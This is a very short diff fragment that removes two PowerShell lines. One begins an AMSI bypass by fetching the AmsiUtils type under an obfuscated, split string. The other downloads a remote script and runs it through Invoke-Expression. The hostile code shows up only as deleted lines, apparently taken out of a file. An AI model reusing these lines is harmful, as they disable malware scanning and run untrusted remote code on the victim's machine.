@@ -1,2 +1,0 @@
-$object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
-$wbc.DownloadString("$prefixpath/Grilled.ps1.c7") | iex
